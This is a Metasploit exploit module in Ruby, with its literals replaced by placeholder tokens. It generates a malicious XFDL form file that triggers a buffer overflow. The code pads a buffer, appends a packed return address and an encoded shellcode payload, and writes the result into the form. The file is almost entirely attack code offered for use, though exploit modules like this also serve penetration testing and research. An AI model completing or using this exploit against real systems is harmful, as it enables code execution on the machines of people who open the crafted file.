require <str> require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include REXML include Msf :: Exploit :: FILEFORMAT def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > { <str> = > <int> , <str> = > Msf :: Encoder :: Type :: AlphanumUnicodeMixed , <str> = > { <str> = > <str> , <str> = > <int> } , <str> = > ( <hex> .. <hex> ) . to_a . pack ( <str> ) + ( <hex> .. <hex> ) . to_a . pack ( <str> ) + <str> + ( <hex> .. <hex> ) . to_a . pack ( <str> ) , <str> = > true , <str> = > <str> + <str> + <str> + <str> } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> , <str> = > <hex> , <str> = > <int> } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) end def generate_xfdl xml = Document . new xfdl = xml . add_element ( <str> , { <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> , <str> = > <str> } ) xdfl_global_page = xfdl . add_element ( <str> , { <str> = > <str> } ) global = xdfl_global_page . add_element ( <str> , { <str> = > <str> } ) designer_date = global . add_element ( <str> ) designer_date . text = <str> form_id = global . add_element ( <str> ) form_id . add_element ( <str> ) serial_number = form_id . add_element ( <str> ) serial_number . text = <str> version_form = form_id . add_element ( <str> ) version_form . text = <str> page = xfdl . add_element ( <str> , { <str> = > <str> } ) page_global = page . add_element ( <str> , { <str> = > <str> } ) label_page = page_global . add_element ( <str> ) label_page . text = <str> label = page . add_element ( <str> , { <str> = > <str> } ) item_location = label . add_element ( <str> ) x = item_location . add_element ( <str> ) x . text = <str> y = item_location . add_element ( <str> ) y . text = <str> value = label . add_element ( <str> , { <str> = > <str> } ) value . text = rand_text_alpha ( <int> ) font_info = label . add_element ( <str> ) font_name = font_info . add_element ( <str> ) font_name . text = <str> xml . to_s end def exploit sploit = rand_text_alpha ( target [ <str> ] ) sploit << <str> sploit << [ target . ret ] . pack ( <str> ) sploit << [ target [ <str> ] ] . pack ( <str> ) sploit << payload . encoded sploit << rand_text_alpha ( <int> ) xfdl = generate_xfdl . gsub ( <str> , sploit ) print_status ( <str> datastore [ <str> ] <str> ) file_create ( xfdl ) end end 
